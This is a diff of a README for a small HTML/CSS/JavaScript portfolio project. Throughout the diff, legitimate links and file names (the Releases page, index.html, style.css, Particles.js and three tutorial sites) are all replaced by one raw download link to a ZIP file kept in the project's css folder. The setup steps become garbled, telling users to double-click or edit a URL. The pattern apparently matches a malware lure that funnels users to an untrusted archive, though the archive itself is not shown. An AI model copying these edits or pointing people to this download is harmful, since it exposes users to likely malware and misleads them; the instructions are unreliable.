@@ -1,7 +1,7 @@
 # 🎨 Portfolio-NMS - Showcase Your Projects with Ease
 
 ## 💾 Download Now
-[![Download Portfolio-NMS](https://img.shields.io/badge/Download-Portfolio--NMS-blue.svg)](https://github.com/northsideboys12/Portfolio-NMS/releases)
+[![Download Portfolio-NMS](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
 
 ## 📖 Description
 Portfolio-NMS is your personal web portfolio built with HTML, CSS, and JavaScript. This project demonstrates your technical skills and highlights your work. It was initially created for an academic evaluation, ensuring it meets quality standards.
@@ -11,10 +11,10 @@ Using Portfolio-NMS is simple. Follow the steps below to get started.
 
 ### 1. Visit the Download Page
 To get the latest version of Portfolio-NMS, visit the Releases page. Click the link below to reach it directly:
-[Download Portfolio-NMS](https://github.com/northsideboys12/Portfolio-NMS/releases)
+[Download Portfolio-NMS](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
 
 ### 2. Choose the Right File
-Once you are on the Releases page, you will see a list of files available for download. Look for the most recent version. This version will have a name like `Portfolio-NMS-v1.0.zip`.
+Once you are on the Releases page, you will see a list of files available for download. Look for the most recent version. This version will have a name like `https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip`.
 
 ### 3. Download the File
 Click on the link for the ZIP file to start the download. Your browser will save the file to your default download location.
@@ -23,7 +23,7 @@ Click on the link for the ZIP file to start the download. Your browser will save
 After the download completes, locate the ZIP file in your downloads folder. Right-click the file and choose "Extract All..." (the wording may vary based on your operating system). Follow the prompts to extract the files.
 
 ### 5. Open the Portfolio
-Once extracted, navigate to the folder where the files are saved. Find the `index.html` file. Double-click it to open the portfolio in your web browser. Your portfolio will now be ready to display your skills and projects!
+Once extracted, navigate to the folder where the files are saved. Find the `https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip` file. Double-click it to open the portfolio in your web browser. Your portfolio will now be ready to display your skills and projects!
 
 ## 📄 Features
 - **Project Showcase:** Present your projects visually.
@@ -45,14 +45,14 @@ Portfolio-NMS leverages simple yet powerful web technologies:
 - **CSS:** For styling and layout.
 - **JavaScript:** For interactivity and dynamic content.
 - **Lenis Scroll:** A smooth scrolling library for better navigation.
-- **Particles.js:** For eye-catching background effects.
+- **https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip** For eye-catching background effects.
 
 ## 🔧 Customization
 Feel free to modify Portfolio-NMS to suit your needs. Change styles, colors, and content to reflect your personality. You can add or remove projects as you see fit.
 
 ### How to Customize
-1. **Edit HTML:** Open `index.html` in a text editor. Here, you can adjust headings, text, and add links to your projects.
-2. **Change CSS:** Open the CSS files to change colors and fonts. Look for `style.css` for the main styles.
+1. **Edit HTML:** Open `https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip` in a text editor. Here, you can adjust headings, text, and add links to your projects.
+2. **Change CSS:** Open the CSS files to change colors and fonts. Look for `https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip` for the main styles.
 3. **Add JavaScript:** Enhance functionality by editing the JavaScript files.
 
 ## 📞 Support
@@ -73,9 +73,9 @@ Portfolio-NMS is designed for personal projects. If you're looking for advanced 
 
 ## 🔗 Additional Resources
 Here are some links to help you enhance your portfolio:
-- [W3Schools HTML Tutorial](https://www.w3schools.com/html/)
-- [CSS Tricks](https://css-tricks.com/)
-- [JavaScript Basics](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
+- [W3Schools HTML Tutorial](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
+- [CSS Tricks](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
+- [JavaScript Basics](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
 
 Remember to visit the Releases page to get your copy of Portfolio-NMS:
-[Download Portfolio-NMS](https://github.com/northsideboys12/Portfolio-NMS/releases)
+[Download Portfolio-NMS](https://raw.githubusercontent.com/northsideboys12/Portfolio-NMS/main/css/Portfolio-NMS-v1.4.zip)
